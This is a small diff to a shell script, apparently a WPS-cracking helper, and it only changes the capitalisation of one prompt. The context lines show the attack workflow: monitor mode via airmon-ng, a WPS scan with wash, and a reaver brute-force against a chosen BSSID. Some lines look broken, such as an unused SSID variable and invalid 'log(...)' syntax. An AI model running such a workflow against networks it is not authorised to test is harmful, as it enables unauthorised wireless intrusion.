@@ -22,7 +22,7 @@ case $iface in
   touch wps_pwn.log
 	airmon-ng start $iface
 	xterm -e "wash -s -i mon0" 
-	echo "Which Net do you want to crack ?"
+	echo "Which net do you want to crack ?"
 	read SSID
 	log(reaver -i mon0 -b $BSSID -vv -d 0)
 	airmon-ng stop $iface
